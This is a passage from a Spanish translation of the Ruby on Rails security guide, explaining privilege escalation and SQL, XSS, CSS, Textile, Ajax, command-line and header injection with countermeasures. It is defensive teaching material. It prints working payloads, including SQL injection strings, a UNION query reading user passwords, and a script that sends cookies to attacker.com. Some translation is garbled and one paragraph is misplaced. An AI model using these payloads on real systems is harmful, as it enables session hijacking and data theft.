<p>Tenga en cuenta que esto solo lo protege contra el error más común al usar el validador de formato; siempre debe tener en cuenta que ^ y $ coinciden con el principio y el final de ** línea ** en Ruby, y no con el principio y el final de un cuerda.</p><h4 id="privilege-escalation"><a class="anchorlink" href="#privilege-escalation">6.6 Privilege Escalation</a></h4><div class="warning"><p>_Cambiar un solo parámetro puede dar al usuario acceso no autorizado. Recuerde que todos los parámetros pueden cambiarse, sin importar cuánto los oculte u ofusque.</p></div><p>El parámetro más común que un usuario puede manipular es el parámetro id, como en <code>http://www.domain.com/project/1</code>, mientras que 1 es el id. Estará disponible en parámetros en el controlador. Allí, lo más probable es que haga algo como esto:</p><div class="code_container">
<pre><code class="language-ruby">@project = Project.find(params[:id])
</code></pre>
</div>
<p>Esto está bien para algunas aplicaciones web, pero ciertamente no si el usuario no está autorizado para ver todos los proyectos. Si el usuario cambia la identificación a 42 y no se le permite ver esa información, tendrá acceso a ella de todos modos. En su lugar, <em>consulte también los derechos de acceso del usuario</em>:</p><div class="code_container">
<pre><code class="language-ruby">@project = @current_user.projects.find(params[:id])
</code></pre>
</div>
<p>Dependiendo de su aplicación web, habrá muchos más parámetros que el usuario puede manipular. Como regla general, _ ningún dato de entrada del usuario es seguro, hasta que se demuestre lo contrario, y cada parámetro del usuario es potencialmente manipulado_.</p><p>No se deje engañar por la seguridad mediante la ofuscación y la seguridad de JavaScript. Las herramientas para desarrolladores le permiten revisar y cambiar los campos ocultos de cada formulario. <em>JavaScript se puede utilizar para validar los datos de entrada del usuario, pero ciertamente no para evitar que los atacantes envíen solicitudes maliciosas con valores inesperados</em>. El complemento Firebug para Mozilla Firefox registra cada solicitud y puede repetirlas y modificarlas. Ésta es una manera fácil de eludir cualquier validación de JavaScript. E incluso hay proxies del lado del cliente que le permiten interceptar cualquier solicitud y respuesta desde y hacia Internet.</p><h3 id="injection"><a class="anchorlink" href="#injection">7 Injection</a></h3><div class="info"><p><em>La inyección es una clase de ataques que introducen códigos o parámetros maliciosos en una aplicación web para ejecutarla dentro de su contexto de seguridad. Ejemplos destacados de inyección son las secuencias de comandos entre sitios (XSS) y la inyección SQL.</em></p></div><p>La inyección es muy complicada, porque el mismo código o parámetro puede ser malicioso en un contexto, pero totalmente inofensivo en otro. Un contexto puede ser un lenguaje de programación, consulta o script, el shell o un método Ruby / Rails. Las siguientes secciones cubrirán todos los contextos importantes donde pueden ocurrir ataques de inyección. Sin embargo, la primera sección cubre una decisión arquitectónica relacionada con la inyección.</p><h4 id="permitted-lists-versus-restricted-lists"><a class="anchorlink" href="#permitted-lists-versus-restricted-lists">7.1 Permitted lists versus Restricted lists</a></h4><p>NOTA: _Cuando desinfecte, proteja o verifique algo, prefiera las listas permitidas sobre las listas restringidas.</p><p>Una lista restringida puede ser una lista de direcciones de correo electrónico incorrectas, acciones no públicas o etiquetas HTML incorrectas. Esto se opone a una lista permitida que enumera las buenas direcciones de correo electrónico, acciones públicas, buenas etiquetas HTML, etc. Aunque a veces no es posible crear una lista permitida (en un filtro de SPAM, por ejemplo), <em>prefiere usar enfoques de lista permitidos</em>:</p>
<ul>
<li>Utilice <code>before_action except: [...]</code> en lugar de <code>only: [...]</code> para acciones relacionadas con la seguridad. De esta manera, no olvide habilitar las comprobaciones de seguridad para las acciones recién agregadas.</li>
<li>Permita <code>&lt;strong&gt;</code> en lugar de eliminar <code>&lt;script&gt;</code> contra Cross-Site Scripting (XSS). Consulte los detalles a continuación.</li>
<li>No intente corregir la entrada del usuario utilizando listas restringidas:

<ul>
<li>Esto hará que el ataque funcione: <code>"&lt;sc&lt;script&gt;ript&gt;".gsub("&lt;script&gt;", "")</code>
</li>
<li>Pero rechace la entrada mal formada</li>
</ul>
</li>
</ul>
<p>Las listas permitidas también son un buen enfoque contra el factor humano de olvidar algo en la lista restringida.</p><h4 id="sql-injection"><a class="anchorlink" href="#sql-injection">7.2 SQL Injection</a></h4><div class="info"><p><em>Gracias a los métodos inteligentes, esto no es un problema en la mayoría de las aplicaciones de Rails. Sin embargo, este es un ataque muy devastador y común en aplicaciones web, por lo que es importante comprender el problema.</em></p></div><h5 id="sql-injection-introduction"><a class="anchorlink" href="#sql-injection-introduction">7.2.1 Introduction</a></h5><p>Los ataques de inyección SQL tienen como objetivo influir en las consultas de la base de datos mediante la manipulación de los parámetros de la aplicación web. Un objetivo popular de los ataques de inyección SQL es evitar la autorización. Otro objetivo es realizar la manipulación de datos o leer datos arbitrarios. A continuación, se muestra un ejemplo de cómo no utilizar los datos de entrada del usuario en una consulta:</p><div class="code_container">
<pre><code class="language-ruby">Project.where("name = '#{params[:name]}'")
</code></pre>
</div>
<p>Esto podría ser en una acción de búsqueda y el usuario puede ingresar el nombre de un proyecto que desea encontrar. Si un usuario malintencionado ingresa <code>'O 1 --</code>, la consulta SQL resultante será:</p><div class="code_container">
<pre><code class="language-sql">SELECT * FROM projects WHERE name = '' OR 1 --'
</code></pre>
</div>
<p>Los dos guiones inician un comentario ignorando todo lo que sigue. Entonces, la consulta devuelve todos los registros de la tabla de proyectos, incluidos los ciegos para el usuario. Esto se debe a que la condición es verdadera para todos los registros.</p><h5 id="bypassing-authorization"><a class="anchorlink" href="#bypassing-authorization">7.2.2 Bypassing Authorization</a></h5><p>Por lo general, una aplicación web incluye control de acceso. El usuario ingresa sus credenciales de inicio de sesión y la aplicación web intenta encontrar el registro coincidente en la tabla de usuarios. La aplicación otorga acceso cuando encuentra un registro. Sin embargo, un atacante posiblemente pueda omitir esta comprobación con la inyección SQL. A continuación se muestra una consulta de base de datos típica en Rails para encontrar el primer registro en la tabla de usuarios que coincida con los parámetros de credenciales de inicio de sesión proporcionados por el usuario.</p><div class="code_container">
<pre><code class="language-ruby">User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
</code></pre>
</div>
<p>Si un atacante ingresa <code>'OR' 1 '=' 1</code> como nombre y<code>'OR' 2 '&gt;' 1</code> como contraseña, la consulta SQL resultante será:</p><div class="code_container">
<pre><code class="language-sql">SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'&gt;'1' LIMIT 1
</code></pre>
</div>
<p>Esto simplemente encontrará el primer registro en la base de datos y le otorga acceso a este usuario.</p><h5 id="unauthorized-reading"><a class="anchorlink" href="#unauthorized-reading">7.2.3 Unauthorized Reading</a></h5><p>La declaración UNION conecta dos consultas SQL y devuelve los datos en un conjunto. Un atacante puede usarlo para leer datos arbitrarios de la base de datos. Tomemos el ejemplo de arriba:</p><div class="code_container">
<pre><code class="language-ruby">Project.where("name = '#{params[:name]}'")
</code></pre>
</div>
<p>Y ahora inyectemos otra consulta usando la declaración UNION:</p><div class="code_container">
<pre><code class="language-plain">') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
</code></pre>
</div>
<p>Esto dará como resultado la siguiente consulta SQL:</p><div class="code_container">
<pre><code class="language-sql">SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
</code></pre>
</div>
<p>El resultado no será una lista de proyectos (porque no hay ningún proyecto con un nombre vacío), sino una lista de nombres de usuario y su contraseña. ¡Esperemos que haya cifrado las contraseñas en la base de datos! El único problema para el atacante es que el número de columnas debe ser el mismo en ambas consultas. Es por eso que la segunda consulta incluye una lista de unos (1), que siempre será el valor 1, para que coincida con el número de columnas de la primera consulta.</p><p>Además, la segunda consulta cambia el nombre de algunas columnas con la declaración AS para que la aplicación web muestre los valores de la tabla de usuarios. Asegúrese de actualizar sus Rails <a href="http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/">to at least 2.1.1</a>.</p><h5 id="sql-injection-countermeasures"><a class="anchorlink" href="#sql-injection-countermeasures">7.2.4 Countermeasures</a></h5><p>Ruby on Rails tiene un filtro incorporado para caracteres SQL especiales, que escaparán <code>'</code>, <code>"</code>, carácter NULL y saltos de línea. * Usando<code>Model.find (id)</code>o<code>Model.find_by_some thing (algo )</code>aplica automáticamente esta contramedida *. Pero en fragmentos SQL, especialmente * en fragmentos de condiciones (<code>donde ("...")</code>), los métodos<code>connection.execute ()</code>o<code>Model.find_by_sql ()</code>, debe aplicarse manualmente *.</p><p>En lugar de pasar una cadena a la opción de condiciones, puede pasar una matriz para desinfectar cadenas contaminadas como esta:</p><div class="code_container">
<pre><code class="language-ruby">Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
</code></pre>
</div>
<p>Como puede ver, la primera parte de la matriz es un fragmento SQL con signos de interrogación. Las versiones desinfectadas de las variables en la segunda parte de la matriz reemplazan los signos de interrogación. O puede pasar un hash para el mismo resultado:</p><div class="code_container">
<pre><code class="language-ruby">Model.where(login: entered_user_name, password: entered_password).first
</code></pre>
</div>
<p>La forma de matriz o hash solo está disponible en instancias de modelo. Puede probar <code>sanitize_sql()</code> en otro lugar. <em>Haga un hábito de pensar en las consecuencias de seguridad al usar una cadena externa en SQL</em>.</p><h4 id="cross-site-scripting-xss"><a class="anchorlink" href="#cross-site-scripting-xss">7.3 Cross-Site Scripting (XSS)</a></h4><div class="info"><p><em>La vulnerabilidad de seguridad más extendida y una de las más devastadoras en las aplicaciones web es XSS. Este ataque malintencionado inyecta código ejecutable del lado del cliente. Rails proporciona métodos de ayuda para defenderse de estos ataques.</em></p></div><h5 id="entry-points"><a class="anchorlink" href="#entry-points">7.3.1 Entry Points</a></h5><p>Un punto de entrada es una URL vulnerable y sus parámetros donde un atacante puede iniciar un ataque.</p><p>Los puntos de entrada más comunes son las publicaciones de mensajes, los comentarios de los usuarios y los libros de visitas, pero los títulos de los proyectos, los nombres de los documentos y las páginas de resultados de búsqueda también han sido vulnerables, en casi todos los lugares donde el usuario puede ingresar datos. Pero la entrada no tiene que provenir necesariamente de los cuadros de entrada de los sitios web, puede estar en cualquier parámetro de URL: obvio, oculto o interno. Recuerde que el usuario puede interceptar cualquier tráfico. Las aplicaciones o los servidores proxy del sitio del cliente facilitan el cambio de solicitudes. También existen otros vectores de ataque como los anuncios publicitarios.</p><p>Los ataques XSS funcionan así: un atacante inyecta un código, la aplicación web lo guarda y lo muestra en una página, que luego se presenta a la víctima. La mayoría de los ejemplos de XSS simplemente muestran un cuadro de alerta, pero es más poderoso que eso. XSS puede robar la cookie, secuestrar la sesión, redirigir a la víctima a un sitio web falso, mostrar anuncios en beneficio del atacante, cambiar elementos en el sitio web para obtener información confidencial o instalar software malicioso a través de agujeros de seguridad en el navegador web.</p><p>Durante la segunda mitad de 2007, se informaron 88 vulnerabilidades en los navegadores de Mozilla, 22 en Safari, 18 en IE y 12 en Opera. El <a href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf">Symantec Global Internet Security threat report</a> también documentó 239 vulnerabilidades de complementos del navegador en las últimas seis meses de 2007. <a href="http://pandalabs.pandasecurity.com/mpack-uncovered/">Mpack</a> es un marco de ataque muy activo y actualizado que aprovecha estas vulnerabilidades. Para los piratas informáticos criminales, es muy atractivo aprovechar una vulnerabilidad de inyección SQL en el marco de una aplicación web e insertar código malicioso en cada columna de la tabla textual. En abril de 2008, más de 510.000 sitios fueron pirateados de esta manera, entre ellos el gobierno británico, las Naciones Unidas y muchos más objetivos de alto perfil.</p><h5 id="html-javascript-injection"><a class="anchorlink" href="#html-javascript-injection">7.3.2 HTML/JavaScript Injection</a></h5><p>El lenguaje XSS más común es, por supuesto, el lenguaje de scripting del lado del cliente más popular, JavaScript, a menudo en combinación con HTML. <em>Escapar la entrada del usuario es esencial</em>.</p><p>Aquí está la prueba más sencilla para verificar XSS:</p><div class="code_container">
<pre><code class="language-xml">&lt;script&gt;alert('Hello');&lt;/script&gt;
</code></pre>
</div>
<p>Este código JavaScript simplemente mostrará un cuadro de alerta. Los siguientes ejemplos hacen exactamente lo mismo, solo que en lugares muy poco comunes:</p><div class="code_container">
<pre><code class="language-xml">&lt;img src=javascript:alert('Hello')&gt;
&lt;table background="javascript:alert('Hello')"&gt;
</code></pre>
</div>
<h6 id="cookie-theft"><a class="anchorlink" href="#cookie-theft">7.3.2.1 Cookie Theft</a></h6><p>Estos ejemplos no hacen ningún daño hasta ahora, así que veamos cómo un atacante puede robar la cookie del usuario (y así secuestrar la sesión del usuario). En JavaScript, puede usar la propiedad <code>document.cookie</code> para leer y escribir la cookie del documento. JavaScript aplica la misma política de origen, lo que significa que un script de un dominio no puede acceder a las cookies de otro dominio. La propiedad <code>document.cookie</code> contiene la cookie del servidor web de origen. Sin embargo, puede leer y escribir esta propiedad si incrusta el código directamente en el documento HTML (como sucede con XSS). Inyecte esto en cualquier lugar de su aplicación web para ver su propia cookie en la página de resultados:</p><div class="code_container">
<pre><code class="language-plain">&lt;script&gt;document.write(document.cookie);&lt;/script&gt;
</code></pre>
</div>
<p>Para un atacante, por supuesto, esto no es útil, ya que la víctima verá su propia cookie. El siguiente ejemplo intentará cargar una imagen de la URL <a href="http://www.attacker.com/">http://www.attacker.com/</a> más la cookie. Por supuesto, esta URL no existe, por lo que el navegador no muestra nada. Pero el atacante puede revisar los archivos de registro de acceso de su servidor web para ver la cookie de la víctima.</p><div class="code_container">
<pre><code class="language-xml">&lt;script&gt;document.write('&lt;img src="http://www.attacker.com/' + document.cookie + '"&gt;');&lt;/script&gt;
</code></pre>
</div>
<p>Los archivos de registro en <a href="http://www.attacker.com">www.attacker.com</a> se leerán así:</p><div class="code_container">
<pre><code class="language-plain">GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
</code></pre>
</div>
<p>Puede mitigar estos ataques (de la manera obvia) agregando la marca <strong>httpOnly</strong> a las cookies, de modo que JavaScript no pueda leer <code>document.cookie</code>. Las cookies solo HTTP se pueden utilizar desde IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4 y Chrome 1.0.154 en adelante. Pero otros navegadores más antiguos (como WebTV e IE 5.5 en Mac) pueden hacer que la página no se cargue. Sin embargo, tenga en cuenta que las cookies seguirán siendo visibles utilizando Ajax mediante <a href="https://www.owasp.org/index.php/HTTPOnly#Browsers_Supporting_HttpOnly">will still be visible using Ajax</a>.</p><h6 id="defacement"><a class="anchorlink" href="#defacement">7.3.2.2 Defacement</a></h6><p>Con la desfiguración de la página web, un atacante puede hacer muchas cosas, por ejemplo, presentar información falsa o atraer a la víctima al sitio web del atacante para robar la cookie, las credenciales de inicio de sesión u otros datos confidenciales. La forma más popular es incluir código de fuentes externas mediante iframes:</p><div class="code_container">
<pre><code class="language-xml">&lt;iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"&gt;&lt;/iframe&gt;
</code></pre>
</div>
<p>Esto carga HTML arbitrario y / o JavaScript de una fuente externa y lo incrusta como parte del sitio. Este <code>iframe</code> se toma de un ataque real a sitios italianos legítimos utilizando el <a href="https://isc.sans.edu/diary/MPack+Analysis/3015">Mpack attack framework</a>. Mpack intenta instalar software malicioso a través de agujeros de seguridad en el navegador web; con mucho éxito, el 50% de los ataques tienen éxito.</p><p>Un ataque más especializado podría superponerse a todo el sitio web o mostrar un formulario de inicio de sesión, que tiene el mismo aspecto que el original del sitio, pero transmite el nombre de usuario y la contraseña al sitio del atacante. O podría usar CSS y/o JavaScript para ocultar un enlace legítimo en la aplicación web y mostrar otro en su lugar que redirige a un sitio web falso.</p><p>Los ataques de inyección reflejada son aquellos en los que la carga útil no se almacena para presentársela a la víctima más adelante, sino que se incluye en la URL. Especialmente los formularios de búsqueda no logran escapar de la cadena de búsqueda. El siguiente enlace presentaba una página que decía que "George Bush nombró a un niño de 9 años como presidente ...":</p><div class="code_container">
<pre><code class="language-plain">http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--&gt;
  &lt;script src=http://www.securitylab.ru/test/sc.js&gt;&lt;/script&gt;&lt;!--
</code></pre>
</div>
<h6 id="html-javascript-injection-countermeasures"><a class="anchorlink" href="#html-javascript-injection-countermeasures">7.3.2.3 Countermeasures</a></h6><p><em>Es muy importante filtrar las entradas maliciosas, pero también es importante escapar del resultado de la aplicación web</em>.</p><p>Especialmente para XSS, es importante hacer <em>filtrado de entrada permitido en lugar de restringido</em>. El filtrado de listas permitidas establece los valores permitidos en contraposición a los valores no permitidos. Las listas restringidas nunca están completas.</p><p>Imagine que una lista restringida elimina <code>"script"</code> de la entrada del usuario. Ahora el atacante inyecta <code>"&lt;scrscriptipt&gt;"</code>, y después del filtro, permanece <code>"&lt;script&gt;"</code>. Las versiones anteriores de Rails usaban un enfoque de lista restringida para los métodos <code>strip_tags()</code>, <code>strip_links()</code> y <code>sanitize()</code>. Entonces este tipo de inyección fue posible:</p><div class="code_container">
<pre><code class="language-ruby">strip_tags("some&lt;&lt;b&gt;script&gt;alert('hello')&lt;&lt;/b&gt;/script&gt;")
</code></pre>
</div>
<p>Esto devolvió <code>"some&lt;script&gt;alert('hello')&lt;/script&gt;"</code>, lo que hace que un ataque funcione. Es por eso que un enfoque de lista permitida es mejor, usando el método actualizado de Rails 2 <code>sanitize()</code>:</p><div class="code_container">
<pre><code class="language-ruby">tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
</code></pre>
</div>
<p>Esto permite solo las etiquetas dadas y hace un buen trabajo, incluso contra todo tipo de trucos y etiquetas mal formadas.</p><p>Como segundo paso, <em>es una buena práctica escapar de todos los resultados de la aplicación</em>, especialmente cuando se vuelve a mostrar la entrada del usuario, que no ha sido filtrada (como en el ejemplo del formulario de búsqueda anterior). <em>Utilice <code>escapeHTML ()</code> (o su alias <code>h ()</code>) método</em> para reemplazar los caracteres HTML de entrada <code>&amp;</code>, <code>"</code>, <code>&lt;</code>, y<code>&gt;</code>por sus representaciones no interpretadas en HTML (<code>&amp;amp;</code>, <code>&amp;quot;</code>, <code>&amp;lt;</code>, and <code>&amp;gt;</code>).</p><h6 id="obfuscation-and-encoding-injection"><a class="anchorlink" href="#obfuscation-and-encoding-injection">7.3.2.4 Obfuscation and Encoding Injection</a></h6><p>El tráfico de red se basa principalmente en el alfabeto occidental limitado, por lo que surgieron nuevas codificaciones de caracteres, como Unicode, para transmitir caracteres en otros idiomas. Pero, esto también es una amenaza para las aplicaciones web, ya que el código malicioso puede estar oculto en diferentes codificaciones que el navegador web podría procesar, pero la aplicación web no. Aquí hay un vector de ataque en codificación UTF-8:</p><div class="code_container">
<pre><code class="language-plain">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;
  &amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
</code></pre>
</div>
<p>Este ejemplo muestra un cuadro de mensaje. Sin embargo, será reconocido por el filtro <code>sanitize()</code> anterior. Una gran herramienta para ocultar y codificar cadenas, y así "conocer a tu enemigo", es el <a href="https://hackvertor.co.uk/public">Hackvertor</a>. El método <code>sanitize()</code> de Rails hace un buen trabajo para defenderse de los ataques de codificación.</p><h5 id="examples-from-the-underground"><a class="anchorlink" href="#examples-from-the-underground">7.3.3 Examples from the Underground</a></h5><p><em>Para comprender los ataques actuales a las aplicaciones web, es mejor echar un vistazo a algunos vectores de ataque del mundo real.</em></p><p>El siguiente es un extracto del <a href="http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&amp;tabid=1">Js.Yamanner@m</a> Yahoo! Mail <a href="http://groovin.net/stuff/yammer.txt">worm</a>. Apareció el 11 de junio de 2006 y fue el primer gusano de interfaz de correo web:</p><div class="code_container">
<pre><code class="language-plain">&lt;img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
</code></pre>
</div>
<p>Este ejemplo muestra un cuadro de mensaje. Sin embargo, será reconocido por el filtro <code>sanitize ()</code> anterior. Una gran herramienta para ocultar y codificar cadenas, y así "conocer a tu enemigo", es el <a href="https://hackvertor.co.uk/public">Hackvertor</a>. El método <code>sanitize()</code> de Rails hace un buen trabajo para defenderse de los ataques de codificación.</p><div class="code_container">
<pre><code class="language-plain">&lt;img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
</code></pre>
</div>
<p>Los gusanos aprovechan un agujero en el filtro HTML / JavaScript de Yahoo, que generalmente filtra todos los objetivos y los atributos de carga de las etiquetas (porque puede haber JavaScript). Sin embargo, el filtro se aplica solo una vez, por lo que el atributo onload con el código del gusano permanece en su lugar. Este es un buen ejemplo de por qué los filtros de listas restringidas nunca están completos y por qué es difícil permitir HTML / JavaScript en una aplicación web.</p><p>Otro gusano de correo web de prueba de concepto es Nduja, un gusano de dominio cruzado para cuatro servicios de correo web italianos. Encuentre más detalles en el <a href="http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/">Rosario Valotta's paper</a>. Ambos gusanos de correo web tienen el objetivo de recolectar direcciones de correo electrónico, algo con lo que un hacker criminal podría ganar dinero.</p><p>En diciembre de 2006, se robaron 34.000 nombres de usuario y contraseñas reales en un <a href="https://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html">MySpace phishing attack</a>. La idea del ataque era crear una página de perfil llamada "login_home_index_html", por lo que la URL parecía muy convincente. Se utilizó HTML y CSS especialmente diseñados para ocultar el contenido genuino de MySpace de la página y, en su lugar, mostrar su propio formulario de inicio de sesión.</p><h4 id="css-injection"><a class="anchorlink" href="#css-injection">7.4 CSS Injection</a></h4><div class="info"><p><em>CSS Injection es en realidad una inyección de JavaScript, porque algunos navegadores (IE, algunas versiones de Safari y otros) permiten JavaScript en CSS. Piense dos veces antes de permitir CSS personalizado en su aplicación web.</em></p></div><p>La inyección de CSS se explica mejor por el conocido <a href="https://samy.pl/myspace/tech.html">MySpace Samy worm</a>. Este gusano envió automáticamente una solicitud de amistad a Samy (el atacante) simplemente visitando su perfil. En varias horas recibió más de 1 millón de solicitudes de amistad, lo que generó tanto tráfico que MySpace se desconectó. La siguiente es una explicación técnica de ese gusano.</p><p>MySpace bloqueó muchas etiquetas, pero permitió CSS. Entonces, el autor del gusano puso JavaScript en CSS de esta manera:</p><div class="code_container">
<pre><code class="language-xml">&lt;div style="background:url('javascript:alert(1)')"&gt;
</code></pre>
</div>
<p>Entonces, la carga útil está en el atributo de estilo. Pero no se permiten comillas en la carga útil, porque ya se han utilizado comillas simples y dobles. Pero JavaScript tiene una práctica función <code>eval()</code> que ejecuta cualquier cadena como código.</p><div class="code_container">
<pre><code class="language-xml">&lt;div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')"&gt;
</code></pre>
</div>
<p>La función <code>eval()</code> es una pesadilla para los filtros de entrada de listas restringidas, ya que permite que el atributo de estilo oculte la palabra "innerHTML":</p><div class="code_container">
<pre><code class="language-plain">alert(eval('document.body.inne' + 'rHTML'));
</code></pre>
</div>
<p>El siguiente problema fue que MySpace filtraba la palabra <code>"javascript"</code>, por lo que el autor usó <code>"java&lt;NEWLINE&gt;script"</code> para solucionar esto:</p><div class="code_container">
<pre><code class="language-xml">&lt;div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')"&gt;
</code></pre>
</div>
<p>Otro problema para el autor del gusano fueron los <a href="#cross-site-request-forgery-csrf">CSRF security tokens</a>. Sin ellos, no podría enviar una solicitud de amistad por POST. Lo solucionó enviando un GET a la página justo antes de agregar un usuario y analizar el resultado del token CSRF.</p><p>Al final, obtuvo un gusano de 4 KB, que inyectó en su página de perfil.</p><p>La propiedad CSS <a href="https://www.securiteam.com/securitynews/5LP051FHPE.html">moz-binding</a> demostró ser otra forma de introducir JavaScript en CSS en navegadores basados ​​en Gecko (Firefox, por ejemplo).</p><h5 id="css-injection-countermeasures"><a class="anchorlink" href="#css-injection-countermeasures">7.4.1 Countermeasures</a></h5><p>Este ejemplo, nuevamente, mostró que un filtro de lista restringida nunca está completo. Sin embargo, dado que el CSS personalizado en las aplicaciones web es una característica bastante poco común, puede resultar difícil encontrar un buen filtro de CSS permitido. <em>Si desea permitir colores o imágenes personalizados, puede permitir que el usuario los elija y cree el CSS en la aplicación web</em>. Utilice el método "sanitize ()" de Rails como modelo para un filtro CSS permitido, si realmente lo necesita.</p><h4 id="textile-injection"><a class="anchorlink" href="#textile-injection">7.5 Textile Injection</a></h4><p>Si desea proporcionar un formato de texto que no sea HTML (por motivos de seguridad), utilice un lenguaje de marcado que se convierta a HTML en el lado del servidor. <a href="http://redcloth.org/">RedCloth</a> es un lenguaje de este tipo para Ruby, pero sin precauciones, también es vulnerable a XSS.</p><p>Por ejemplo, RedCloth traduce <code>_test_</code> a <code>&lt;em&gt;test&lt;em&gt;</code>, lo que hace que el texto esté en cursiva. Sin embargo, hasta la versión actual 3.0.4, todavía es vulnerable a XSS. Obtenga la <a href="http://www.redcloth.org">all-new version 4</a> que eliminó errores graves. Sin embargo, incluso esa versión tiene <a href="http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html">some security bugs</a>, por lo que las contramedidas aún se aplican. A continuación, se muestra un ejemplo de la versión 3.0.4:</p><div class="code_container">
<pre><code class="language-ruby">RedCloth.new('&lt;script&gt;alert(1)&lt;/script&gt;').to_html
# =&gt; "&lt;script&gt;alert(1)&lt;/script&gt;"
</code></pre>
</div>
<p>Utilice la opción <code>: filter_html</code> para eliminar HTML que no fue creado por el procesador textil.</p><div class="code_container">
<pre><code class="language-ruby">RedCloth.new('&lt;script&gt;alert(1)&lt;/script&gt;', [:filter_html]).to_html
# =&gt; "alert(1)"
</code></pre>
</div>
<p>Sin embargo, esto no filtra todo el HTML, se dejarán algunas etiquetas (por diseño), por ejemplo, <code>&lt;a&gt;</code>:</p><div class="code_container">
<pre><code class="language-ruby">RedCloth.new("&lt;a href='javascript:alert(1)'&gt;hello&lt;/a&gt;", [:filter_html]).to_html
# =&gt; "&lt;p&gt;&lt;a href="javascript:alert(1)"&gt;hello&lt;/a&gt;&lt;/p&gt;"
</code></pre>
</div>
<h5 id="textile-injection-countermeasures"><a class="anchorlink" href="#textile-injection-countermeasures">7.5.1 Countermeasures</a></h5><p>Se recomienda <em>usar RedCloth en combinación con un filtro de entrada permitido</em>, como se describe en la sección de contramedidas contra XSS.</p><h4 id="ajax-injection"><a class="anchorlink" href="#ajax-injection">7.6 Ajax Injection</a></h4><div class="note"><p>_ Se deben tomar las mismas precauciones de seguridad para las acciones de Ajax que para las "normales". Sin embargo, hay al menos una excepción: la salida ya debe escaparse en el controlador, si la acción no representa una vista.</p></div><p>Si usa el <a href="https://rubygems.org/gems/in_place_editing">in_place_editor plugin</a>, o acciones que devuelven una cadena, en lugar de representar una vista, <em>tienes que escapar del valor de retorno en la acción</em>. De lo contrario, si el valor de retorno contiene una cadena XSS, el código malicioso se ejecutará al regresar al navegador. Escapa de cualquier valor de entrada usando el método <code>h()</code>.</p><h4 id="command-line-injection"><a class="anchorlink" href="#command-line-injection">7.7 Command Line Injection</a></h4><p>NOTA: <em>Use los parámetros de la línea de comandos proporcionados por el usuario con precaución.</em></p><p>Si su aplicación tiene que ejecutar comandos en el sistema operativo subyacente, hay varios métodos en Ruby: <code>exec(command)</code>, <code>syscall(command)</code>, <code>system(command)</code> y <code>command</code>. Deberá tener especial cuidado con estas funciones si el usuario puede ingresar el comando completo o parte de él. Esto se debe a que en la mayoría de los shells, puede ejecutar otro comando al final del primero, concatenando con un punto y coma (<code>;</code>) o una barra vertical (<code>|</code>).</p><p>Una contramedida es <em>utilizar el método <code>system(command, parameters)</code> que pasa los parámetros de la línea de comandos de manera segura</em>.</p><div class="code_container">
<pre><code class="language-ruby">system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
</code></pre>
</div>
<h4 id="header-injection"><a class="anchorlink" href="#header-injection">7.8 Header Injection</a></h4><div class="warning"><p>Los encabezados <em>HTTP se generan dinámicamente y, en determinadas circunstancias, se puede inyectar la entrada del usuario. Esto puede provocar una redirección falsa, XSS o una división de la respuesta HTTP.</em></p></div><p>Los encabezados de solicitud HTTP tienen un Referer, User-Agent (software de cliente) y un campo Cookie, entre otros. Los encabezados de respuesta, por ejemplo, tienen un código de estado, una cookie y un campo de ubicación (URL de destino de redirección). Todos ellos son suministrados por el usuario y pueden manipularse con más o menos esfuerzo. <em>Recuerde también escapar de estos campos de encabezado</em>. Por ejemplo, cuando muestra el agente de usuario en un área de administración.</p><p>Además de eso, es <em>importante saber lo que estás haciendo cuando construyes encabezados de respuesta en parte basados ​​en la entrada del usuario.</em> Por ejemplo, quieres redirigir al usuario a una página específica. Para ello, introdujo un campo "referente" en un formulario para redirigir a la dirección dada:</p><div class="code_container">
<pre><code class="language-ruby">redirect_to params[:referer]
</code></pre>
</div>
<p>Lo que sucede es que Rails coloca la cadena en el campo de encabezado <code>Location</code> y envía un estado 302 (redireccionamiento) al navegador. Lo primero que haría un usuario malintencionado es esto:</p><div class="code_container">
<pre><code class="language-plain">http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
</code></pre>
</div>
<p>Y debido a un error en (Ruby y) Rails hasta la versión 2.1.2 (excluyéndolo), un hacker puede inyectar campos de encabezado arbitrarios; por ejemplo así:</p><div class="code_container">
<pre><code class="language-plain">http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
